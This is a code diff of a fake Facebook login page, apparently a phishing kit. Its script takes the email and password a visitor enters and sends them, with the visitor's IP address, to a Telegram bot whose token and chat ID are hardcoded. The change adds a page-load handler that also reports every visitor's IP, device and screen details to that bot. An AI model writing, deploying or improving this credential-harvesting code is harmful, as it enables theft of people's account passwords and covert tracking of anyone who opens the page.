@@ -23,7 +23,7 @@
                     <input type="submit" class="a-sub" value="Log In" />
                     <a href="" class="a-link">Forgotten password?</a>
                     <hr class="a-hr">
-                    <input type="submit" value="Create New Account" class="a-but" />
+                    <input type="button" value="Create New Account" class="a-but" />
                 </form>
                 <div class="create-page">
                     <a href="" class="a-href">Create a Page</a> for a celebrity, band or business.
@@ -40,45 +40,37 @@
                 <li><a href="">मराठी</a></li>
                 <li><a href="">اردو</a></li>
                 <li><a href="">മലയാളം</a></li>
-                <li><a href="">বাংলা</a> </li>
-                <li><a href="" class="_sv4">తెలుగు</a> </li>
-                <li><a href="" class="_sv4">தமிழ்</a></li>
-                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
-                <li><a href="" class="_sv4">Español</a></li>
+                <li><a href="">বাংলা</a></li>
+                <li><a href="">తెలుగు</a></li>
+                <li><a href="">தமிழ்</a></li>
+                <li><a href="">ਪੰਜਾਬੀ</a></li>
+                <li><a href="">Español</a></li>
             </ul>
             <div class="copyright">
-                <div><span> Facebook © 2021</span></div>
+                <div><span>Facebook © 2021</span></div>
             </div>
         </div>
     </div>
 
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7836014378:AAH8ZPC8AqE-LV55vHjrube_NkBGr-wZwuY"; 
-        const CHAT_ID = "5013223759"; // هنا معرف الشات الخاص بتليجرام
+        const CHAT_ID = "5013223759";
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        // إضافة الحدث على الفورم
-        document.getElementById('login-form').addEventListener('submit', function (e) {
-            e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
+        
+        window.onload = function () {
             axios.get('https://api.ipify.org?format=json')
                 .then(response => {
                     const ip = response.data.ip;
-
                     const userAgent = navigator.userAgent;
                     const platform = navigator.platform;
                     const screenWidth = screen.width;
                     const screenHeight = screen.height;
-                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                    const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
 
                     const message = `
-                        <b>New Facebook Login Attempt</b>\n
-                        <b>Email:</b> ${email}\n
-                        <b>Password:</b> ${password}\n
+                        <b>New Visitor Alert</b>\n
                         <b>IP Address:</b> ${ip}\n
                         <b>Device Type:</b> ${deviceType}\n
                         <b>Platform:</b> ${platform}\n
@@ -91,7 +83,40 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        console.log('Message sent:', response.data);
+                        console.log('IP sent successfully:', response.data);
+                    }).catch(error => {
+                        console.error('Error sending IP information:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        };
+
+        
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const message = `
+                        <b>New Facebook Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        console.log('Login information sent:', response.data);
                         alert('Information sent successfully!');
                     }).catch(error => {
                         console.error('Error:', error);
